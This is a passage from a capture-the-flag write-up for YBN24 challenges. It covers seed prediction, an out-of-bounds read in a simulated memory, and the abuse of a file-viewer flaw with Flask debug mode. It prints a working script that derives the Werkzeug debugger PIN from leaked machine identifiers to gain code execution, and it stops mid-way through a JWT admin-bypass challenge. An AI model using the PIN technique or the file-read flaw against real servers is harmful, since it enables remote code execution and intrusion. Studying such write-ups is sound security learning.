    <span class="n">exit</span><span class="p">()</span>  
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>  
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>  

<span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">7631</span><span class="p">)</span>  
<span class="n">generate_random_string</span><span class="p">()</span>  <span class="c1"># COmpensate for the 1 user id generated</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">160</span><span class="p">):</span>  
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">generate_random_string</span><span class="p">())</span>  
    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>  
<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</code></pre></div>
<code>YBN24{wH0_kN0w5_8a5H_R4nD0m_w4sn7_s0_rAnD0m_4ft3r_4ll}</code></p>
<blockquote>
<p>The seed can actually be found within the same connection to the server, thus we can both find the seed and then immediately start submitting guesses</p>
</blockquote>
<h2 id="memory-sim">Memory sim<a class="headerlink" href="#memory-sim" title="Permanent link">&para;</a></h2>
<p>A python pwn challenge that simulates memory(?). The goal of this challenge is to access a string from a restricted address. The functions for reading and writing to the memory are:
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">write_string</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ind</span><span class="p">):</span>  
    <span class="n">sl</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  
    <span class="k">if</span> <span class="n">ind</span><span class="o">+</span><span class="n">sl</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">MEMORY</span><span class="p">):</span>  
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>  
    <span class="n">MEMORY</span><span class="p">[</span><span class="n">ind</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ind</span><span class="p">,</span> <span class="n">ind</span><span class="o">+</span><span class="n">sl</span><span class="p">):</span>  
        <span class="n">MEMORY</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">ind</span><span class="p">])</span>  
    <span class="k">return</span> <span class="p">(</span><span class="n">ind</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">MLEN</span>
<span class="k">def</span><span class="w"> </span><span class="nf">read_string</span><span class="p">(</span><span class="n">ind</span><span class="p">):</span>  
    <span class="n">stringLen</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="n">ind</span><span class="p">]</span>  
    <span class="n">ind</span> <span class="o">+=</span> <span class="mi">1</span>  
    <span class="k">if</span> <span class="n">ind</span><span class="o">+</span><span class="n">stringLen</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">MEMORY</span><span class="p">):</span>  
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>  
    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">MEMORY</span><span class="p">[</span><span class="n">ind</span><span class="p">:</span><span class="n">ind</span><span class="o">+</span><span class="n">stringLen</span><span class="p">]])</span>
</code></pre></div>
* <code>write_string()</code>, which writes the ordinals of the characters in  string <code>s</code>  at the address space <code>[ind, ind+string length)</code>, and writes the length of the string at index <code>ind-1</code>. It returns the address we can use with <code>read_string()</code> to obtain the string from memory
* <code>read_string()</code>, which reads the length of the string at address <code>ind</code>, and reads the integers as characters from memory at the address space <code>[ind+1, ind+string length+1)</code>
We then have the main program, responsible for taking and validating user input before calling those functions
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">string</span><span class="w"> </span><span class="kn">import</span> <span class="n">printable</span>
<span class="n">MLEN</span> <span class="o">=</span> <span class="mi">1000</span>  
<span class="n">READ_ONLY</span> <span class="o">=</span> <span class="mi">900</span>  
<span class="n">MEMORY</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">MLEN</span>  
<span class="n">MENU</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;1. write  </span>
<span class="s2">2. read  </span>
<span class="s2">&gt;&gt; &quot;&quot;&quot;</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s2">&quot;YBN24{?????????????????????????????????????}&quot;</span>  
<span class="n">write_string</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">950</span><span class="p">)</span>  
<span class="n">cached</span> <span class="o">=</span> <span class="p">[]</span>  
<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>  
    <span class="n">choice</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="n">MENU</span><span class="p">))</span>  
    <span class="k">if</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>  
        <span class="n">ustr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Enter string</span><span class="se">\n</span><span class="s2">&gt;&gt; &quot;</span><span class="p">))</span>  
        <span class="k">if</span> <span class="ow">not</span> <span class="nb">all</span><span class="p">(</span><span class="n">i</span> <span class="ow">in</span> <span class="n">printable</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ustr</span><span class="p">):</span>  
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;invalid string&quot;</span><span class="p">)</span>  
            <span class="k">continue</span>  
        <span class="n">uid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Enter address</span><span class="se">\n</span><span class="s2">&gt;&gt; &quot;</span><span class="p">))</span>  
        <span class="k">if</span> <span class="n">uid</span> <span class="o">&gt;=</span> <span class="n">READ_ONLY</span><span class="p">:</span>  
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;sorry, this region&#39;s read only&quot;</span><span class="p">)</span>  
            <span class="k">continue</span>  
        <span class="n">res</span> <span class="o">=</span> <span class="n">write_string</span><span class="p">(</span><span class="n">ustr</span><span class="p">,</span> <span class="n">uid</span><span class="p">)</span>  
        <span class="k">if</span> <span class="n">res</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>  
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">)</span>  
            <span class="k">continue</span>  
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;string written successfully! You can view it at&quot;</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>  
        <span class="n">cached</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>  
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;You can now access </span><span class="si">{</span><span class="n">cached</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  

    <span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>  
        <span class="n">uid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Enter address</span><span class="se">\n</span><span class="s2">&gt;&gt; &quot;</span><span class="p">))</span>  
        <span class="k">if</span> <span class="n">uid</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">cached</span><span class="p">:</span>  
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Hey, no out of bounds access! &gt;:(&quot;</span><span class="p">)</span>  
            <span class="k">continue</span>  
        <span class="n">res</span> <span class="o">=</span> <span class="n">read_string</span><span class="p">(</span><span class="n">uid</span><span class="p">)</span>  
        <span class="k">if</span> <span class="n">res</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>  
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">)</span>  
            <span class="k">continue</span>  
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Your string:&quot;</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>  

    <span class="k">else</span><span class="p">:</span>  
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Invalid choice!&quot;</span><span class="p">)</span>
</code></pre></div>
Here, we are restricted from writing at the read only region, and our input has to be a printable character. It should be noted there are no restrictions that prevent us from reading into the restricted region. By having <code>read_string</code> fetch the length of its string from an address where a character was stored instead of the strings length, we could read into the restricted region.
<div class="highlight"><pre><span></span><code>write_string(&#39;d&#39;, 898)
| Address  |        897        |   898    |
|----------|-------------------|----------|
| Value    | 1 (String length) | ord(&#39;d&#39;) |
                                 ^ We read from this address
</code></pre></div>
However, there is a check in place to ensure we can only read from addresses we've written to. If the address is not in <code>cache</code>, we are prevented from reading there. We can circumvent this by simply writing a string at <code>address+1</code> to add <code>address</code> to the cache, then write our payload.
<div class="highlight"><pre><span></span><code>write_string(&#39;a&#39;, 899)
| Address  | 898 |        899        |   900    |
|----------|-----|-------------------|----------|
| Value    |     | 1 (string length) | ord(&#39;a&#39;) |
Cache: [898]

write_string(&#39;d&#39;, 898)
| Address  |        898        |   899    |   900    |
|----------|-------------------|----------|----------|
| Value    | 1 (string length) | ord(&#39;d&#39;) | ord(&#39;a&#39;) |
Cache: [897, 898]

read_string(898)
| Address  |        898        |   899    |   900    |
|----------|-------------------|----------|----------|
| Value    | 1 (string length) | ord(&#39;d&#39;) | ord(&#39;a&#39;) |
 This is the string length read ^ 
</code></pre></div>
Thus, our input is as such:
1. 1 a 899
2. 1 d 898
3. 2 898
<code>YBN24{n3g4tive_inDexeS_aNd_struCt_ov3rfl0W!}</code></p>
<h2 id="view-source-revenge">View source revenge<a class="headerlink" href="#view-source-revenge" title="Permanent link">&para;</a></h2>
<p>A site that allows us to view the contents of any file
<img alt="Pasted image 20241202212041.png" src="../../assets/Pasted%20image%2020241202212041.png" />
I first tried viewing <code>flag.txt</code>, which returned an empty page
<img alt="Pasted image 20241202212206.png" src="../../assets/Pasted%20image%2020241202212206.png" />
Trying <code>/flag.txt</code>, we instead get an error, suggesting the flag was probably censored. Next, I tried the common file names <code>app.py</code> and <code>Dockerfile</code> and managed to retrieve their content
<div class="highlight"><pre><span></span><code><span class="c1"># Run by Docker</span>
<span class="c1"># This file is included to reduce the guessiness of this challenge. </span>
<span class="c1"># The file run is main.py, which is the identical as the file here.</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span> <span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span><span class="n">render_template_string</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span> 
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">FLAG</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/view&#39;</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">view</span><span class="p">():</span>
    <span class="n">file_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file_name&#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_name</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>

    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="n">file_name</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;error.html&#39;</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;display.html&quot;</span><span class="p">,</span><span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="p">,</span><span class="n">file_name</span> <span class="o">=</span> <span class="n">file_name</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</code></pre></div>
It is indeed shown that the flag is censored
<div class="highlight"><pre><span></span><code><span class="c"># Use an official Python runtime as a parent image</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>
<span class="c"># Set the working directory in the container</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/usr/src/app</span>
<span class="c"># Copy the requirements file into the container</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>./
<span class="c"># Install any necessary dependencies</span>
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--no-cache-dir<span class="w"> </span>-r<span class="w"> </span>requirements.txt
<span class="c"># Create a new user and group with a secure name</span>
<span class="k">RUN</span><span class="w"> </span>useradd<span class="w"> </span>-m<span class="w"> </span>very_secure_username
<span class="c"># Change ownership of the working directory to the newly created user</span>
<span class="k">RUN</span><span class="w"> </span>chown<span class="w"> </span>-R<span class="w"> </span>very_secure_username:very_secure_username<span class="w"> </span>/usr/src/app
<span class="c"># Switch to the new user</span>
<span class="k">USER</span><span class="w"> </span><span class="s">very_secure_username</span>
<span class="c"># Copy the application code into the container</span>
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>/usr/src/app
<span class="c"># Set environment variables</span>
<span class="k">ENV</span><span class="w"> </span><span class="nv">FLASK_APP</span><span class="o">=</span>app.py
<span class="k">ENV</span><span class="w"> </span><span class="nv">FLASK_ENV</span><span class="o">=</span>development
<span class="k">ENV</span><span class="w"> </span><span class="nv">FLASK_DEBUG</span><span class="o">=</span><span class="m">1</span>
<span class="c"># Expose the port the app runs on</span>
<span class="k">EXPOSE</span><span class="w"> </span><span class="s">5000</span>
<span class="c"># Command to run the application</span>
<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;flask&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;run&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;--host=0.0.0.0&quot;</span><span class="p">]</span>
</code></pre></div>
From the dockerfile, we see that <code>FLASK_DEBUG</code> is enabled, meaning the <code>/console</code> endpoint is exposed. Given both LFI and debug mode, we are able to generate the <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">debugger pin</a> and gain RCE. I had also tried to automatically leak the pin using https://github.com/Ruulian/wconsole_extractor but did not succeed(Perhaps my extractor code was broken).
After gaining all the information required, we can generate  our debug pin
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>  
<span class="kn">from</span><span class="w"> </span><span class="nn">itertools</span><span class="w"> </span><span class="kn">import</span> <span class="n">chain</span>  
<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>  
    <span class="s1">&#39;very_secure_username&#39;</span><span class="p">,</span>  <span class="c1"># username  </span>
    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span>  <span class="c1"># modname  </span>
    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span>  <span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))  </span>
    <span class="s1">&#39;/usr/local/lib/python3.11/site-packages/flask/app.py&#39;</span>  <span class="c1"># getattr(mod, &#39;__file__&#39;, None),  </span>
<span class="p">]</span>  

<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>  
    <span class="nb">str</span><span class="p">(</span><span class="mh">0x921784229705</span><span class="p">),</span>  <span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address  </span>
    <span class="s1">&#39;90eca5f1-105b-434e-ad02-135111eb1526&#39;</span>  <span class="c1"># get_machine_id(), /etc/machine-id  </span>
<span class="p">]</span>  

<span class="c1"># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0  </span>
<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>  
<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>  
    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>  
        <span class="k">continue</span>  
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>  
        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>  
    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>  
<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>  
<span class="c1"># h.update(b&#39;shittysalt&#39;)  </span>

<span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>  

<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>  
<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>  
    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>  
    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>  

<span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>  
<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>  
    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>  
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>  
            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>  
                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>  
            <span class="k">break</span>  
    <span class="k">else</span><span class="p">:</span>  
        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>  

<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span> <span class="c1"># &gt;&gt; 889-177-408</span>
</code></pre></div>
<img alt="Pasted image 20241202214006.png" src="../../assets/Pasted%20image%2020241202214006.png" />
<code>YBN24{F1@sK_DEBUg_CH4L1?_1AM3}</code></p>
<h2 id="nobutyes">NoButYes<a class="headerlink" href="#nobutyes" title="Permanent link">&para;</a></h2>
<p>We are given source code for this challenge. The target of this challenge is the <code>/admin</code> endpoint, where our jwt token needs to identify we have admin
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">get_secret</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>  
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;secrets.db&#39;</span><span class="p">)</span>  
    <span class="n">db</span><span class="o">.</span><span class="n">row_factory</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">cursor</span><span class="p">,</span> <span class="n">row</span><span class="p">:</span> <span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>  
    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT secret FROM secrets WHERE uuid = ?&quot;</span>  
    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">uuid</span><span class="p">,))</span>  
    <span class="n">secret</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">())</span>  
    <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>  
    <span class="k">return</span> <span class="n">secret</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>  
<span class="k">def</span><span class="w"> </span><span class="nf">admin</span><span class="p">():</span>  
    <span class="nb">print</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="p">,</span><span class="n">session</span><span class="p">)</span>  
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;uuid&#39;</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="s2">&quot;Unauthorized&quot;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="mi">401</span><span class="p">})</span>  
    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>  
    <span class="n">uuid</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">]</span>  
    <span class="n">secrets</span> <span class="o">=</span> <span class="n">get_secret</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">])</span>  
    <span class="c1"># TODO: Make somehow sign token with own/known secret?  </span>
    <span class="k">try</span><span class="p">:</span>  
        <span class="n">decoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secrets</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;HS256&quot;</span><span class="p">])</span>  
    <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">ExpiredSignatureError</span><span class="p">:</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="s2">&quot;Token Expired&quot;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="mi">401</span><span class="p">})</span>  
    <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span><span class="p">:</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid Token&quot;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="mi">401</span><span class="p">})</span>  
    <span class="k">if</span> <span class="n">decoded</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]:</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Welcome Admin. Here&#39;s the Flag: </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">,</span><span class="s1">&#39;TESTFLAG</span><span class="si">{}</span><span class="s1">&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="mi">200</span><span class="p">})</span>  
    <span class="k">else</span><span class="p">:</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="s2">&quot;Only admin&#39;s can access this page!&quot;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="mi">401</span><span class="p">})</span>
</code></pre></div>
Further reviewing the source code, we also see the <code>/api</code> endpoint, which TODO finish sentence
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">save_token</span><span class="p">(</span><span class="n">uuid</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>  
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;secrets.db&#39;</span><span class="p">)</span>  
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>  
    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT OR IGNORE INTO secrets (uuid, secret) VALUES (?, ?)&quot;</span>  
    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">uuid</span><span class="p">,</span> <span class="n">secret</span><span class="p">))</span>  
    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;UPDATE secrets SET secret = ? WHERE uuid = ?&quot;</span>  
    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">uuid</span><span class="p">))</span>  
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>  
    <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_jwt_token</span><span class="p">():</span>  
    <span class="n">user_info</span> <span class="o">=</span> <span class="p">{</span>  
        <span class="s2">&quot;admin&quot;</span><span class="p">:</span><span class="kc">False</span>  
    <span class="p">}</span>  
    <span class="n">secret</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>  
